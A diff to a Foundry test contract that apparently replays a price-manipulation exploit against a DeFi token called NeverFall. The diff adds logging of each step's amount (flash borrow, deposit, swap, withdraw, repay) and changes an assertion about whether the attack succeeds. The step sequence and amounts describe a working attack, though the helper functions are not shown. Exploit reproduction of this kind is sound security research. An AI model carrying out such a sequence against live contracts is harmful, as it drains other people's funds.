@@ -234,14 +234,20 @@ contract NeverFallTestBase is Test, BlockLoader {
 
     function test_gt() public {
         vm.startPrank(attacker);
+        emit log_named_uint("amt0", 1600000e18);
         borrow_usdt_owner(1600000e18);
         printBalance("After step0 ");
+        emit log_named_uint("amt1", 200000 * 1e18);
         deposit_neverFall_usdt_neverFall(200000 * 1e18);
         printBalance("After step1 ");
+        emit log_named_uint("amt2", 1300000 * 1e18);
+        emit log_named_uint("amt3", 0);
         swap_pair_attacker_usdt_neverFall(1300000 * 1e18, 0);
         printBalance("After step2 ");
+        emit log_named_uint("amt4", neverFall.balanceOf(attacker));
         withdraw_neverFall_neverFall_usdt(neverFall.balanceOf(attacker));
         printBalance("After step3 ");
+        emit log_named_uint("amt5", 1600000e18);
         payback_usdt_owner(1600000e18);
         printBalance("After step4 ");
         require(attackGoal(), "Attack failed!");
@@ -263,7 +269,7 @@ contract NeverFallTestBase is Test, BlockLoader {
         swap_pair_attacker_usdt_neverFall(amt2, amt3);
         withdraw_neverFall_neverFall_usdt(amt4);
         payback_usdt_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 }
